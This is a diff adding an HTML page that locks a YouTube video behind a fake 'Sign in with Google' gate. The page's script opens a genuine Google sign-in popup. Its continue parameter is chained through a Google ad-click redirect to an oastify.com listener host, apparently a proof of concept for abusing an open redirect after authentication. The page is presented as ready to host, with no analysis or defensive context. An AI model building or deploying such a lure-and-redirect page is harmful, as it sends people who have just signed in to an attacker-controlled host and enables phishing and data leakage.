@@ -1,0 +1,160 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Google Login Popup (With Confirm)</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background-color: #f9f9f9;
+    }
+
+    #video-container {
+      position: relative;
+      display: block;
+      margin-top: 30px;
+      width: 560px;
+      height: 315px;
+      margin-left: auto;
+      margin-right: auto;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: 0;
+    }
+
+    #overlay-lock {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 18px;
+      z-index: 10;
+      cursor: not-allowed;
+      transition: opacity 0.3s ease;
+    }
+
+    #login-button {
+      padding: 12px 24px;
+      font-size: 16px;
+      color: #444;
+      background-color: #fff;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      transition: background-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    #login-button:hover {
+      background-color: #f1f1f1;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    }
+
+    #login-button img {
+      width: 20px;
+      height: 20px;
+    }
+
+    #confirm-login {
+      margin-top: 20px;
+      display: none;
+    }
+
+    #confirm-login button {
+      padding: 10px 20px;
+      font-size: 14px;
+      border: none;
+      border-radius: 5px;
+      background-color: #34a853;
+      color: white;
+      cursor: pointer;
+    }
+
+    #confirm-login button:hover {
+      background-color: #2c8b46;
+    }
+
+  </style>
+</head>
+<body>
+
+  <h1>Please Sign In to Watch the Video</h1>
+
+  <button id="login-button">
+    <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google Logo" />
+    Sign in with Google
+  </button>
+
+  <div id="confirm-login">
+    <p>Did you finish logging in?</p>
+    <button id="confirm-button">Yes, I did!</button>
+  </div>
+
+  <div id="video-container">
+    <iframe
+      src="https://www.youtube.com/embed/1r7RlKRHu40"
+      title="YouTube video player"
+      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+      allowfullscreen>
+    </iframe>
+
+    <!-- Overlay lock -->
+    <div id="overlay-lock">Please sign in to play the video</div>
+  </div>
+
+  <script>
+    const loginButton = document.getElementById('login-button');
+    const overlayLock = document.getElementById('overlay-lock');
+    const confirmSection = document.getElementById('confirm-login');
+    const confirmButton = document.getElementById('confirm-button');
+
+    loginButton.addEventListener('click', () => {
+      const googleLoginURL = 'https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Ff7nql2o3ddbta2p0p6yik39ywp2h15rtg.oastify.com%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0';
+
+      const popupWidth = 500;
+      const popupHeight = 600;
+      const left = (screen.width / 2) - (popupWidth / 2);
+      const top = (screen.height / 2) - (popupHeight / 2);
+
+      const loginWindow = window.open(
+        googleLoginURL,
+        'Google Login',
+        `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`
+      );
+
+      const checkPopupClosed = setInterval(() => {
+        if (loginWindow.closed) {
+          clearInterval(checkPopupClosed);
+          // Show confirm section after popup closes
+          confirmSection.style.display = 'block';
+        }
+      }, 1000);
+    });
+
+    confirmButton.addEventListener('click', () => {
+      // Remove overlay lock
+      overlayLock.style.display = 'none';
+      loginButton.style.display = 'none';
+      confirmSection.style.display = 'none';
+    });
+  </script>
+
+</body>
+</html>
